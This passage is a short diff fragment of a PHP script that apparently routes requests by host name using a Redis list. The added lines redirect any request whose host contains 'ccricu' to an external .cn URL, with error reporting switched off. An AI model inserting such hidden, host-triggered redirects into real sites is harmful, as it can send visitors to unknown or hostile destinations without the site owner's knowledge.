@@ -5,6 +5,9 @@ error_reporting(0);
  $redis = new Predis\Client($redis_conf);
  $redis->auth($redis_conf['auth']);
  $url = $_SERVER['HTTP_HOST'];
+ if(strstr($url,'ccricu')){
+   header("Location:http://ytnuao.cn/jf13");
+}
  $is_url = $redis->lindex('url_list',$url);
  if($is_url){
      
